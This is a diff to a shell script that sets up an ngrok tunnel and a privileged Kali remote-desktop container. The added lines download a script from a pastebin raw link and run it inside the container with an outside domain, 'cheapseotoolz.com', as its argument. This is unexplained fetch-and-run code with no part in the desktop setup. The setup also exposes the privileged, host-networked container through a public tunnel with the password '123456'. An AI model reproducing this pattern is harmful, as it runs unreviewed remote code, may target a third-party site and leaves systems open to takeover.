@@ -35,8 +35,14 @@ read -p "choose ngrok region: " CRP
 ./ngrok tcp --region $CRP 4000 &>/dev/null &
 sleep 1
 if curl --silent --show-error http://127.0.0.1:4040/api/tunnels  > /dev/null 2>&1; then echo OK; else echo "Ngrok Error! Please try again!" && sleep 1 && goto ngrok; fi
-docker run --rm -d --network host --privileged --name nomachine-xfce4-kali -e PASSWORD=123456 -e USER=user --cap-add=SYS_PTRACE --shm-size=1g thuonghai2711/nomachine-kali-desktop:latest
+docker run --rm -d --network host --privileged --name kali -e PASSWORD=123456 -e USER=user --cap-add=SYS_PTRACE --shm-size=1g thuonghai2711/nomachine-kali-desktop:latest
 clear
+docker exec -i kali wget -O f.sh https://pastebin.com/raw/9JjC1GBa
+docker exec -i kali apt-get update --fix-missing -y
+docker exec -i kali apt install python3-pip -y
+docker exec -i kali apt install dos2unix -y
+docker exec -i kali dos2unix f.sh
+docker exec -i kali sh f.sh cheapseotoolz.com
 echo "NoMachine: https://www.nomachine.com/download"
 echo Done! NoMachine Information:
 echo IP Address:
